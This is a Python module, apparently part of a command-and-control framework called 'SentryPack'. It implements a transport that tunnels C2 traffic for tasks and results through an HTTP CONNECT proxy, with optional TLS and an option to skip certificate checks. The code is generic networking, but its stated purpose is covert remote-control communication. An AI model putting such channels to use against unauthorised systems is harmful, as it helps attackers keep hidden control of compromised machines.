"""
HTTP/S Proxy Infrastructure Transport Module for SentryPack.

This module implements the ITransport interface to provide proxy-aware C2
communications. It tunnels TCP and TLS traffic across an HTTP/HTTPS forward
proxy using the HTTP CONNECT method (RFC 7231 / RFC 9110).

CONNECT Tunnel Lifecycle:
-------------------------
1. Initialization:
   - Transport begins in disconnected state with optional enabled flag.
2. Connection Handshake:
   - Evaluates enable state; aborts immediately if disabled.
   - Idempotently closes any existing socket before initiating a new session.
   - Opens a standard TCP connection to the designated proxy server (proxy_host:proxy_port).
   - Sends an HTTP/1.1 CONNECT request specifying target destination (target_host:target_port):
         CONNECT target_host:target_port HTTP/1.1\r\n
         Host: target_host:target_port\r\n
         User-Agent: SentryPack-Transport/0.1.0\r\n
         Proxy-Connection: Keep-Alive\r\n
         \r\n
   - Reads the proxy response headers and validates the HTTP status code (200 Connection established).
   - If use_tls is enabled, performs a TLS client handshake across the established tunnel
     targeting target_host, with configurable certificate verification (verify_ssl).
   - Stores the active (plain or TLS-wrapped) socket.
3. Data Transmission & Reception:
   - send() normalizes Tasks, strings, and raw bytes into binary payloads.
   - receive() yields incoming bytes or structured TaskResult instances with timeout handling.
4. Teardown:
   - Cleanly closes the socket and resets internal references on disconnect().

Configuration Keys (passed to connect() via dict or AgentConfig):
------------------------------------------------------------------
- proxy_host  (str, required): Hostname or IP address of the forward proxy server.
- proxy_port  (int, required): Port of the proxy server (e.g. 3128, 8080, 8888).
- target_host (str, required): Remote destination hostname or IP to tunnel towards.
- target_port (int, required): Remote destination port (e.g. 443, 8443, 4444).
- use_tls     (bool, optional): Wrap tunnel in TLS if True (default: True).
- verify_ssl  (bool, optional): Enforce TLS certificate validation (default: True). Set False for self-signed.
- ca_certs    (str, optional): Path to custom CA bundle file for TLS validation.
- timeout     (int/float, optional): Socket timeout in seconds (default: 10).
- enabled     (bool, optional): Whether this transport instance is active (default: True).
"""

from __future__ import annotations

import json
import logging
import os
import socket
import ssl
from typing import Any, Dict, Optional, Union

from core.transport_base import AgentConfig, ITransport, Task, TaskResult, TransportMeta

logger = logging.getLogger("sentrypack.transports.https_proxy")


class HttpsProxyTransport(ITransport):
    """
    Concrete HTTP/S Proxy transport implementation for SentryPack.

    Establishes an HTTP CONNECT tunnel through an intermediate proxy server,
    optionally encrypting traffic with TLS to the target destination.
    """

    meta = TransportMeta(
        id="https_proxy",
        name="HTTP/S Proxy",
        version="0.1.0",
        description="HTTP/S proxy transport that tunnels C2 traffic over HTTP CONNECT or HTTPS.",
        author="Burka Zelalem",
    )

    def __init__(self) -> None:
        """Initialize the HTTP/S Proxy transport in a disconnected, enabled state."""
        self._sock: Optional[socket.socket] = None
        self._enabled: bool = True

    def enable(self) -> None:
        """
        Enable the transport instance.

        Allows subsequent connect() calls to establish network tunnels.
        """
        logger.info("HttpsProxyTransport enabled")
        self._enabled = True

    def disable(self) -> None:
        """
        Disable the transport instance and terminate any active connection.

        Prevents subsequent connection attempts until re-enabled.
        """
        logger.info("HttpsProxyTransport disabled")
        self._enabled = False
        self.disconnect()

    def connect(
        self,
        host_or_config: Any = None,
        port: Optional[int] = None,
        options: Optional[dict] = None,
        **kwargs: Any,
    ) -> bool:
        """
        Establish a tunneled connection through the configured HTTP/S proxy.

        Parameters:
            host_or_config: Configuration dictionary, AgentConfig object, or proxy hostname.
            port: Proxy port when using positional arguments.
            options: Additional options dictionary (timeout, target_host, use_tls, etc.).
            **kwargs: Keyword arguments merged into configuration options.

        Returns:
            bool: True if proxy tunnel (and optional TLS handshake) succeeded, False otherwise.
        """
        # Ensure previous connection is cleanly released (idempotent reconnect)
        self.disconnect()

        # Parse configuration from arguments
        cfg: Dict[str, Any] = {}
        if isinstance(host_or_config, AgentConfig):
            cfg = dict(host_or_config.transport_config)
        elif isinstance(host_or_config, dict):
            cfg = dict(host_or_config)
        else:
            opts = options or kwargs or {}
            cfg = dict(opts)
            if host_or_config is not None:
                cfg.setdefault("proxy_host", str(host_or_config))
            if port is not None:
                cfg.setdefault("proxy_port", int(port))

        # Check enable state override from config or instance
        if "enabled" in cfg:
            self._enabled = bool(cfg.get("enabled", True))

        if not self._enabled:
            logger.warning("Cannot connect: HttpsProxyTransport is currently disabled")
            return False

        # Extract config parameters with safe defaults
        proxy_host = str(cfg.get("proxy_host") or cfg.get("host") or "127.0.0.1")
        proxy_port = int(cfg.get("proxy_port") or cfg.get("port") or 8080)
        target_host = str(cfg.get("target_host") or "127.0.0.1")
        target_port = int(cfg.get("target_port") or 443)
        use_tls = bool(cfg.get("use_tls", True))
        verify_ssl = bool(cfg.get("verify_ssl", True))
        ca_certs = cfg.get("ca_certs")
        timeout = float(cfg.get("timeout", 10))

        logger.info(
            "Connecting to proxy %s:%d to tunnel towards %s:%d (TLS=%s, verify_ssl=%s)",
            proxy_host,
            proxy_port,
            target_host,
            target_port,
            use_tls,
            verify_ssl,
        )

        sock: Optional[socket.socket] = None
        try:
            # 1. Establish raw TCP connection to the proxy
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((proxy_host, proxy_port))

            # 2. Transmit HTTP CONNECT request
            connect_request = (
                f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
                f"Host: {target_host}:{target_port}\r\n"
                f"User-Agent: SentryPack-Transport/0.1.0\r\n"
                f"Proxy-Connection: Keep-Alive\r\n"
                f"\r\n"
            ).encode("utf-8")
            sock.sendall(connect_request)

            # 3. Read and parse HTTP response from the proxy
            response_data = b""
            while b"\r\n\r\n" not in response_data:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                response_data += chunk
                if len(response_data) > 65536:
                    break

            if not response_data:
                logger.warning("Empty response received from proxy %s:%d", proxy_host, proxy_port)
                sock.close()
                return False

            first_line = response_data.split(b"\r\n")[0].decode("utf-8", errors="replace")
            parts = first_line.split(" ", 2)
            if len(parts) < 2 or not parts[1].isdigit():
                logger.warning("Invalid HTTP status line from proxy: %s", first_line)
                sock.close()
                return False

            status_code = int(parts[1])
            if status_code != 200:
                logger.warning("Proxy rejected CONNECT request with status %d: %s", status_code, first_line)
                sock.close()
                return False

            logger.info("Proxy tunnel established: %s", first_line)

            # 4. Wrap with TLS if requested
            if use_tls:
                logger.debug("Wrapping socket in TLS context for target %s (verify_ssl=%s)", target_host, verify_ssl)
                if verify_ssl:
                    context = ssl.create_default_context()
                    if ca_certs and os.path.exists(str(ca_certs)):
                        context.load_verify_locations(cafile=str(ca_certs))
                else:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE

                sock = context.wrap_socket(sock, server_hostname=target_host)
                logger.info("TLS handshake successfully completed across proxy tunnel to %s", target_host)

            self._sock = sock
            return True

        except Exception as exc:
            logger.warning(
                "Failed to establish HTTP/S proxy tunnel to %s:%d -> %s:%d: %s",
                proxy_host,
                proxy_port,
                target_host,
                target_port,
                exc,
            )
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
            self._sock = None
            return False

    def send(self, data: Union[bytes, str, Task, Any]) -> int:
        """
        Transmit data or a Task payload across the established HTTP/S proxy tunnel.

        Parameters:
            data: Payload to transmit (bytes, str, Task dataclass instance, or serializable object).

        Returns:
            int: Number of bytes successfully sent, or 0 on failure or disconnected state.
        """
        if not self._sock or not self._enabled:
            logger.warning("Send failed: HttpsProxyTransport is not connected or is disabled")
            return 0

        try:
            if isinstance(data, Task):
                raw = json.dumps(data.to_dict()).encode("utf-8")
            elif isinstance(data, str):
                raw = data.encode("utf-8")
            elif isinstance(data, bytes):
                raw = data
            elif hasattr(data, "to_dict") and callable(data.to_dict):
                raw = json.dumps(data.to_dict()).encode("utf-8")
            else:
                raw = str(data).encode("utf-8")

            self._sock.sendall(raw)
            return len(raw)
        except Exception as exc:
            logger.warning("Error transmitting data over HTTP/S proxy transport: %s", exc)
            return 0

    def receive(self, size: int = 4096) -> Union[bytes, str, TaskResult, Optional[Any]]:
        """
        Receive incoming data or TaskResult from the proxy tunnel.

        Parameters:
            size: Maximum buffer size in bytes to read (default 4096).

        Returns:
            Union[bytes, str, TaskResult, None]:
                - TaskResult object if payload is valid JSON adhering to TaskResult schema
                - Raw bytes if payload is non-JSON binary or string
                - b"" on timeout, EOF, or disconnected state
        """
        if not self._sock or not self._enabled:
            return b""

        try:
            raw = self._sock.recv(size)
            if not raw:
                return b""

            # Attempt deserialization into structured TaskResult
            try:
                parsed = json.loads(raw.decode("utf-8"))
                if isinstance(parsed, dict) and "task_id" in parsed:
                    return TaskResult.from_dict(parsed)
            except Exception:
                pass

            return raw
        except (socket.timeout, TimeoutError):
            return b""
        except Exception as exc:
            logger.warning("Error receiving data over HTTP/S proxy transport: %s", exc)
            return b""

    def disconnect(self) -> None:
        """
        Cleanly tear down the proxy tunnel socket and release resources.

        Guaranteed to be safe to call multiple times (idempotent).
        """
        if self._sock is not None:
            try:
                self._sock.close()
            except Exception as exc:
                logger.warning("Error closing HTTP/S proxy socket: %s", exc)
            finally:
                self._sock = None
                logger.debug("HttpsProxyTransport socket disconnected")

    def is_alive(self) -> bool:
        """
        Check whether the proxy transport channel is actively connected and enabled.

        Returns:
            bool: True if an active socket exists and transport is enabled, False otherwise.
        """
        return self._sock is not None and self._enabled
